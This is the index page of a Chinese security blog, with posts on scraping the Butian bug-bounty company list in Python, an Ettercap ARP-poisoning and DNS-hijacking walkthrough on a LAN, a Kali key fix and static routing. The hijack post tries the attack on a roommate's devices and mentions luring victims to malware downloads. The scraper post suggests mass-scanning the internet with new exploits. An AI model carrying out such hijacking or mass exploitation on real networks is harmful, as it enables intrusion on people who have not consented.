<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta name="description" content="信息安全技术博客">
<meta property="og:type" content="website">
<meta property="og:title" content="Lawliet Blog">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="Lawliet Blog">
<meta property="og:description" content="信息安全技术博客">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Lawliet Blog">
<meta name="twitter:description" content="信息安全技术博客">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.3',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/"/>





  <title>Lawliet Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Lawliet Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">原创文章，未经授权请勿转载</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/17/butianspider/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Lawliet">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/LuFei.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Lawliet Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/04/17/butianspider/" itemprop="url">python爬取补天src列表</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-17T17:28:12+08:00">
                2018-04-17
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/python爬虫挑战/" itemprop="url" rel="index">
                    <span itemprop="name">python爬虫挑战</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="用python爬取补天src列表"><a href="#用python爬取补天src列表" class="headerlink" title="用python爬取补天src列表"></a>用python爬取补天src列表</h1><p><strong>分享一个我写的代码，用python爬取补天src列表，同时可以爬取网站域名和漏洞的提交数和处理数，以公益src为例，贴出我写的代码</strong></p>
<pre><code># -*- coding: utf-8 -*-
import requests
from bs4 import BeautifulSoup
url=&quot;http://loudong.360.cn/Reward/pub&quot;
for pnum in range(1,160):
    r=requests.post(url=url,data={&apos;s&apos;:1,&apos;p&apos;:pnum}).json()
    for info in r[&quot;data&quot;][&quot;list&quot;]:
        company_name=info[&quot;company_name&quot;]
        company_url=&quot;http://loudong.360.cn/Company/&quot;+info[&quot;company_id&quot;]
        html=requests.get(url=company_url).content
        soup=BeautifulSoup(html,&quot;lxml&quot;)
        num=soup.find_all(class_=&quot;spp&quot;)
        print &quot;漏洞数:&quot;,num[0].string,&quot;已处理:&quot;,num[1].string
        surl=&quot;http://loudong.360.cn/Loo/submit?cid=&quot;+info[&quot;company_id&quot;]
        headers={&quot;Cookie&quot;:&quot;你登陆后的cookie&quot;}
        html=requests.get(url=surl,headers=headers).content
        soup=BeautifulSoup(html,&quot;lxml&quot;)
        site=soup.find(&quot;input&quot;,attrs={&quot;placeholder&quot;:&quot;请输入厂商域名&quot;})[&quot;value&quot;]
        print company_name
        print site
        print u&quot;漏洞数:&quot;, num[0].string, u&quot;已处理:&quot;, num[1].string
        print &quot;-------------------------------------------------------------------------------------------------&quot;
</code></pre><p><strong>爬取时需要用到的库</strong></p>
<pre><code>requests库和bs4库
</code></pre><p><strong>补天还是十分好爬的，只要分析好每次请求和响应，爬下关键请求的页面，用bs4的BeautifulSoup解析提取数据即可</strong></p>
<p><strong>关于BeautifulSoup，自己写代码很喜欢用，提取数据很方便，<a href="https://www.crummy.com/software/BeautifulSoup/bs4/doc.zh/" title="官方文档" target="_blank" rel="external">官方文档</a>写的非常详细</strong></p>
<p><strong>运行结果</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180417/94aIlf0B6K.png?imageslim" alt="mark"></p>
<h3 id="分享我写爬虫的一些经验"><a href="#分享我写爬虫的一些经验" class="headerlink" title="分享我写爬虫的一些经验"></a>分享我写爬虫的一些经验</h3><p><strong>最后总结一下我多次写爬虫所总结的经验和方法，爬取网页数据通用的一些方法</strong></p>
<p><strong>request库常用总结</strong></p>
<pre><code>html=requests.get(url=url,params={params},headers={headers},cookies={cookies},proxies={proxies}).content
用于http GET方法请求的页面，需要提交参数时可以直接在url的?后加参数，也可以将GET请求参数以字典的数据类型赋值给request库get方法中params参数进行提交
参数作用:

params:字典数据类型，存放http请求的GET参数

headers：字典数据类型，里面内容为http的一些请求头，比如Host，User-Agent，主要用来突破一些网站的防爬机制，cookie值也能放到这个里面

cookies:字典数据类型,用来存放cookie值

proxies：字典数据类型,爬取页面所需要设置的代理，比如爬取谷歌和一些国外网站，因为国内被墙了，搭了ss才能访问，但是直接用python请求页面还是不行，这时候就需要在这里进行设置了，我一般是这样设置的,因为我ss客户端设在了本地1088端口:
proxies={&quot;http&quot;:&quot;http://127.0.0.1:1088&quot;,&quot;https&quot;:&quot;https://127.0.0.1:1088&quot;}

html=requests.post(url=url,data={data},headers={headers},cookies={cookies},proxies={proxies}).content
用于http POST方法请求的页面

data:字典数据类型，POST提交的参数

headers，cookie，proxies:均和上述的作用一致
</code></pre><p><strong>re库常用总结</strong></p>
<pre><code>p=re.compile(r&quot;编写的正则表达式&quot;)
用来编译正则表达式对象并且返回一个正则表达式对象
list=p.findall(页面)
匹配页面中和正则表达式匹配的数据并且将所有结果以列表的形式返回
关于正则表达式，需要多加练习，每个人都有不一样的编写正则方法，只要能将需要的数据精确完整匹配出来的方法都是好方法，特别需要注意贪婪匹配和非贪婪匹配的区别和用法(.*?|.*+)
</code></pre><p><strong>bs4库的BeautifulSoup常用总结</strong></p>
<pre><code>使用BeautifulSoup提取数据，首先要了解html DOM格式:
简单来说就是，&lt;标签 属性=&quot;属性值&quot;&gt;文本&lt;/标签&gt;

from bs4 import BeautifulSoup
soup=BeautifulSoup(html,&quot;lxml&quot;)
返回一个BeautifulSoup对象，我一般比较喜欢用lxml格式解析页面，用多了自然就成习惯了
list=soup.find_all(html标签属性=属性值)
寻找html所有匹配&quot;html标签属性=属性值&quot;的html标签并以列表的形式返回，列表中每个值的类型均为BeautifulSoup对象
for i in list:
    i[&quot;属性&quot;]用来提取某一属性下的属性值
    i.string用来提取html标签中的文本
</code></pre><p><strong>urllib库常用总结</strong></p>
<pre><code>urllib.urlretrieve(url,filename)
urllib库的urlretrieve方法主要用来下载文件，通常将页面爬下来后，用正则表达式或者BeautifulSoup将jpg，png一些图片，xls，doc一些文档，或者mp4等视频连接爬下来后，一般都需要用这个库下载
url:资源的链接
filename：文件存放的位置，我一般这样写，filename=yourfilepath+url.split(&apos;/&apos;)[-1],比较方便
</code></pre><h3 id="我对写爬虫的看法"><a href="#我对写爬虫的看法" class="headerlink" title="我对写爬虫的看法"></a>我对写爬虫的看法</h3><p><strong>以上总结了我写代码的一些方法经验，我对编程的看法是：其实每个人写代码的方式都不太一样，代码写的多了就会有自己的风格。代码主要还是为了解决需求，节省人力，能够将代码用到自己的生活或者工作中，是件很有意思的事情，我觉得写python代码的要点有几个:要多动手写，看官方文档的效率比看书高，编程书是用来查的，百度谷歌很强大</strong></p>
<h3 id="python爬虫能力对安全人员的作用"><a href="#python爬虫能力对安全人员的作用" class="headerlink" title="python爬虫能力对安全人员的作用"></a>python爬虫能力对安全人员的作用</h3><p><strong>开发简单的漏扫工具，需要爬虫的基础</strong></p>
<p><strong>根据漏洞编写exp，新爆出的漏洞，exp早写出来可以多刷些漏洞</strong></p>
<p><strong>*利用搜素引擎批量刷漏洞，对于新爆出的漏洞，编写exp后结合搜索引擎的语法寻找网络空间中的漏洞相关组件去测试，整个过程都可以用python爬虫技术自动化完成</strong></p>
<h3 id="官方文档链接"><a href="#官方文档链接" class="headerlink" title="官方文档链接"></a>官方文档链接</h3><p><strong><a href="https://www.crummy.com/software/BeautifulSoup/bs4/doc.zh/" title="BeautifulSoup官方文档" target="_blank" rel="external">BeautifulSoup官方文档</a></strong></p>
<p><strong><a href="http://docs.python-requests.org/zh_CN/latest/" title="requests官方文档" target="_blank" rel="external">requests官方文档</a></strong></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/21/dns_spoof/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Lawliet">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/LuFei.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Lawliet Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/03/21/dns_spoof/" itemprop="url">Ettercap实现局域网dns劫持</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-21T23:43:32+08:00">
                2018-03-21
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/内网渗透/" itemprop="url" rel="index">
                    <span itemprop="name">内网渗透</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="Ettercap实现局域网dns劫持百度"><a href="#Ettercap实现局域网dns劫持百度" class="headerlink" title="Ettercap实现局域网dns劫持百度"></a>Ettercap实现局域网dns劫持百度</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>很久之前做过的一个实验，利用kali的Ettercap进行局域网的dns劫持，今天实验课老师碰巧又提到了，于是又做了做，这是一个很好玩的实验</strong></p>
<h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p><strong>1.kali2.0操作系统，本人用的32位的，装在vm12虚拟机中，连接自己的RT3070的无线网卡（网卡一定要是kali2.0支持的型号），同时开启apache服务，进行dns劫持</strong></p>
<p><strong>2.自己的真实机，连接本机电脑的无线网卡</strong></p>
<p><strong>3.RT3070网卡和本机电脑网卡连接同一wifi，保证kali和自己的PC在同一局域网，用kali对自己的PC进行DNS缓存投毒</strong></p>
<p><strong>4.用到的软件:kali中的Ettercap，一个集成工具，里面包括了局域网主机扫描，arp欺骗，DNS劫持等功能</strong></p>
<p><strong>5.浏览器:谷歌浏览器</strong></p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><strong>DNS，全称为域名解析协议，是一种将域名解析为ip地址的协议，基于UDP的53端口。比如我们在浏览器访问百度域名，会先向dns服务器发送一次dns请求报文，询问百度的ip地址，dns服务器经过查询（或递归查询）会将百度的域名以及对应的ip地址以dns响应报文的形式发回给我们，然后我们才可以与所对应的ip建立TCP连接进行网络通信。dns劫持建立在arp欺骗的基础上，关于arp的文章之前有写过，链接：<a href="http://lawlietweb.com/2018/01/12/arpattack/" title="arp协议分析&amp;python编程实现arp欺骗抓图片" target="_blank" rel="external">arp协议分析&amp;python编程实现arp欺骗抓图片</a>，通过arp欺骗可以监听受害者机器到网关之间的流量，如果可以过滤协议为UDP，端口为53端口的数据报文，也就是DNS报文，并且将dns响应中的域名所对应的ip地址改写成我们服务器的ip，受害者机器就会与我们的机器进行连接通信，这就是dns投毒的基本原理，kali的Ettercap就可以做到这一点，当然明白了攻击原理，自己编程实现也是可以的，python的scapy库便可以做到，之后有时间会尝试写一下</strong></p>
<h3 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h3><p><strong>1.开启ip转发功能，默认是关闭的</strong></p>
<pre><code>echo &quot;1&quot;&gt; /proc/sys/net/ipv4/ip_forward
</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/510leEijb8.png?imageslim" alt="mark"></p>
<p><strong>2.查看kali的ip为192.168.0.106，并且修改Ettercap的配置文件，添加一条dns解析记录（A记录）</strong></p>
<pre><code>* A 192.168.0.106
</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/1J1aH0aLj8.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/HDi1m44bg0.png?imageslim" alt="mark"><br><strong>意思是将所有域名都解析到我们kali的ip上</strong></p>
<p><strong>3.<code>service apache2 start</code>开启apache服务,并在/var/www/html下新建index.html,就是我们攻击后想要看到的效果页面，自己简单写了个有意思的页面，效果如下</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/BkE7FLFB94.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/17EChCh7Jb.png?imageslim" alt="mark"><br><strong>4.准备工作都做好了，接下来使用Ettercap开始我们的攻击,启动Ettercap图形界面</strong></p>
<pre><code>ettercap -G
</code></pre><p><strong>点击Sniff–&gt;Unified sniffing</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/9ADDfJAl0L.png?imageslim" alt="mark"><br><strong>在这选择wlan0无线网卡，因为kali上网使用的是无线网卡，如果虚拟机插网线桥接，这里选eth0</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/LID0a4lc5G.png?imageslim" alt="mark"><br><strong>接下来点击Hosts–&gt;Scan for hosts,扫描局域网中存活的ip，寻找攻击目标</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/dL74JliCG6.png?imageslim" alt="mark"><br><strong>显示扫到5个主机，点击Hosts list查看</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/K322B8ffKI.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/KaHCj7c2HI.png?imageslim" alt="mark"><br><strong>在ip列表里可以看到网关ip192.168.0.1，还有我们的物理机ip192.168.0.103，接下来开始arp欺骗，具体操作将192.168.0.1Add to Target1，将受害PCip192.168.0.103Add to Target2，然后点击Mitm–&gt;ARP poisoning</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/AFd0bJh14I.png?imageslim" alt="mark"><br><strong>勾选第一个</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/L4bIEcmk0f.png?imageslim" alt="mark"><br><strong>ARP欺骗便开始了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/B5B7GA8cl7.png?imageslim" alt="mark"><br><strong>下面开始dns劫持，点击Plugins–&gt;Manage the plugins</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/FlGj1GEkJK.png?imageslim" alt="mark"><br><strong>选择dns_spood插件，便开始dns欺骗了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/fk3Hf84H0D.PNG" alt="mark"><br><strong>我们这时访问百度，就会看到dns已经被劫持，嘿嘿嘿</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/m725g55cLg.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/3L2dAFhm3i.PNG" alt="mark"><br><strong>同时欺骗了室友的电脑和手机也成功，差点没被打死。。。。就是皮</strong></p>
<p><strong>最后说一下，dns劫持这种攻击不仅限于恶作剧，利用这种攻击，我们还可以诱导受害者进入我们构造的恶意软件下载页面，下载恶意软件以让我们对对方的电脑做一些事情</strong></p>
<p><strong>老铁们遇到dns劫持这种恶作剧，打开cmd命令行输入</strong></p>
<pre><code>ipconfig /flushdns
</code></pre><p><strong>刷新dns缓存即可，然后找到那个皮的人。。。</strong></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/19/kali update error/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Lawliet">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/LuFei.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Lawliet Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/03/19/kali update error/" itemprop="url">解决kali执行apt update时报错</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-19T23:27:48+08:00">
                2018-03-19
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/kali/" itemprop="url" rel="index">
                    <span itemprop="name">kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="解决kali执行apt-update时报错"><a href="#解决kali执行apt-update时报错" class="headerlink" title="解决kali执行apt update时报错"></a>解决kali执行apt update时报错</h1><p><strong>更新kali时在执行apt update遇到如下错误</strong></p>
<pre><code>Get:1 http://kali.mirror.garr.it/mirrors/kali kali-rolling InRelease [30.5 kB]
Err:1 http://kali.mirror.garr.it/mirrors/kali kali-rolling InRelease
The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;
Reading package lists... Done
Building dependency tree       
Reading state information... Done
945 packages can be upgraded. Run &apos;apt list --upgradable&apos; to see them.
W: An error occurred during the signature verification. The repository is not updated and the previous index files will be used. GPG error: http://kali.mirror.garr.it/mirrors/kali kali-rolling InRelease: The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;
W: Failed to fetch http://http.kali.org/kali/dists/kali-rolling/InRelease  The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;
W: Some index files failed to download. They have been ignored, or old ones used instead.
</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180319/9DHI71m4ee.png?imageslim" alt="mark"></p>
<p><strong>解决方法</strong></p>
<pre><code>apt-key adv --keyserver hkp://keys.gnupg.net --recv-keys 7D8D0BF6
</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180319/KGI19B7egm.png?imageslim" alt="mark"></p>
<p><strong>再次执行就可以成功执行了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180319/m3L1eiGCcd.png?imageslim" alt="mark"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/18/routestatic/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Lawliet">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/LuFei.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Lawliet Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/03/18/routestatic/" itemprop="url">eNSP静态路由配置</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-18T23:32:19+08:00">
                2018-03-18
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/网络基础/" itemprop="url" rel="index">
                    <span itemprop="name">网络基础</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="eNSP静态路由配置"><a href="#eNSP静态路由配置" class="headerlink" title="eNSP静态路由配置"></a>eNSP静态路由配置</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>这篇文章的内容来自老师上课布置的一个任务，配置静态路由，想学习好网络安全，这种网络协议的基础是必须要掌握的，也是为了之后的入侵检测系统学习打下基础</strong></p>
<h3 id="课堂给出的拓扑如下"><a href="#课堂给出的拓扑如下" class="headerlink" title="课堂给出的拓扑如下"></a>课堂给出的拓扑如下</h3><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180318/fBGD2l9b88.png?imageslim" alt="mark"></p>
<p><strong>要求四个路由器之前相互可以通信，自己动手实践了一下,将自己的配置过程记录下来，也算课堂的时间没有白费</strong></p>
<h3 id="在配置静态路由之前首先要保证路由器与PC之间以及路由器和路由器之间是通的，各路由器上配置如下"><a href="#在配置静态路由之前首先要保证路由器与PC之间以及路由器和路由器之间是通的，各路由器上配置如下" class="headerlink" title="在配置静态路由之前首先要保证路由器与PC之间以及路由器和路由器之间是通的，各路由器上配置如下"></a>在配置静态路由之前首先要保证路由器与PC之间以及路由器和路由器之间是通的，各路由器上配置如下</h3><pre><code>R1
sy
sysname r1
int e0/0/0
ip add 10.10.10.1 24
q
int g0/0/0
ip add 2.2.2.2 30
q
int g0/0/1
ip add 3.3.3.2 30
q

R2
sy
sysname r2
int e0/0/0
ip add 192.168.2.1 24
q
int g0/0/0
ip add 2.2.2.1 30
1
int g0/0/1
ip add 1.1.1.1 30
q

R3
sy
sysname r3
int e0/0/0
ip add 172.16.2.1 24
q
int g0/0/0
ip add 4.4.4.1 30
q
int g0/0/1
ip add 3.3.3.1 24
q

R4
sy
sysname r4
int g0/0/1
ip add 1.1.1.2 30
q
int g0/0/0
ip add 4.4.4.2 30
q
</code></pre><h3 id="配置静态路由"><a href="#配置静态路由" class="headerlink" title="配置静态路由"></a>配置静态路由</h3><p><strong>配置之前要先明白什么是下一跳地址，以拓扑举例，比如PC1要经过路由R1与PC2通讯，那么在路由R1的路由表中，下一跳地址应该为路由R2:2.2.2.1,所以在R1的路由表中添加一条静态路由</strong></p>
<pre><code>ip route-static 192.168.2.1 255.255.255.0 2.2.2.1
</code></pre><p><strong>同时要在R2的路由表中添加一条PC2到PC1的静态路由</strong></p>
<pre><code>ip route-static 10.10.10.1 255.255.255.0 2.2.2.2
</code></pre><p><strong>了解了上面的基础，剩下的就是在每个路由器里面一一配置，各路由器配置如下</strong> </p>
<p><strong>PC1到PC2之间的通信配置</strong></p>
<pre><code>R1：ip route-static 192.168.2.1 255.255.255.0 2.2.2.1
R2：ip route-static 10.10.10.1 255.255.255.0 2.2.2.2
</code></pre><p><strong>测试PC1和PC2互通</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180319/GH301D7akb.png?imageslim" alt="mark"><br><strong>PC1到PC3之间的通信配置</strong></p>
<pre><code>R1：ip route-static 172.16.2.1 255.255.255.0 3.3.3.1
R3：ip route-static 10.10.10.1 255.255.255.0 3.3.3.2
</code></pre><p><strong>测试PC1和PC3互通</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180319/B5mBkk2hmA.png?imageslim" alt="mark"><br><strong>PC2到PC3之间的通信配置</strong></p>
<pre><code>R2：ip route-static 172.16.2.1 255.255.255.0 1.1.1.2
R4：ip route-static 172.16.2.1 255.255.255.0 4.4.4.1
R3：ip route-static 192.168.2.1 255.255.255.0 4.4.4.2
R4：ip route-static 192.168.2.1 255.255.255.0 1.1.1.1
</code></pre><p><strong>测试PC2和PC3互通</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180319/1jj7hDj12C.png?imageslim" alt="mark"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/12/N1CTF2018/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Lawliet">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/LuFei.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Lawliet Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/03/12/N1CTF2018/" itemprop="url">N1CTF2018 77777 writeup</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
